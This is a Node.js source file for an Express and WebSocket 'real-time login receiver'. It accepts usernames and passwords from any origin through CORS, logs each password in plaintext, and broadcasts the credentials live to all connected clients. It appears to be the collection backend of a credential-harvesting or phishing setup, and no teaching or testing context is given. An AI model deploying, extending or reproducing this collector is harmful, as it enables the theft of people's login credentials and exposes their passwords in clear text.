const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json());

// Store connected clients
const clients = new Set();

// WebSocket connection handler
wss.on('connection', (ws) => {
    console.log('✅ New client connected');
    clients.add(ws);

    // Send welcome message
    ws.send(JSON.stringify({
        type: 'connection',
        message: 'Connected to real-time login receiver',
        timestamp: new Date().toISOString()
    }));

    // Handle incoming messages
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            console.log('\n📨 Received login credentials:');
            console.log('Username:', message.username);
            console.log('Password:', message.password);
            console.log('Timestamp:', message.timestamp);
            console.log('---');

            // Broadcast to all connected clients
            broadcastToClients({
                type: 'login',
                username: message.username,
                password: message.password,
                timestamp: message.timestamp,
                receivedAt: new Date().toISOString()
            });

        } catch (error) {
            console.error('Error parsing message:', error);
        }
    });

    // Handle client disconnect
    ws.on('close', () => {
        console.log('❌ Client disconnected');
        clients.delete(ws);
    });

    // Handle errors
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

// Broadcast message to all connected clients
function broadcastToClients(data) {
    clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

// REST API endpoint (optional - for testing)
app.post('/api/receive-login', (req, res) => {
    const { username, password, timestamp } = req.body;

    console.log('\n📨 Received via REST API:');
    console.log('Username:', username);
    console.log('Password:', password);
    console.log('Timestamp:', timestamp);
    console.log('---');

    // Broadcast to WebSocket clients
    broadcastToClients({
        type: 'login',
        username: username,
        password: password,
        timestamp: timestamp,
        receivedAt: new Date().toISOString()
    });

    res.json({ success: true, message: 'Credentials received' });
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({
        success: true,
        message: 'Real-time login receiver is running',
        connectedClients: clients.size
    });
});

// Start server
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log(`\n🚀 Real-time login receiver running on port ${PORT}`);
    console.log(`📡 WebSocket: ws://localhost:${PORT}`);
    console.log(`🌐 HTTP: http://localhost:${PORT}`);
    console.log('\nWaiting for login credentials...\n');
});
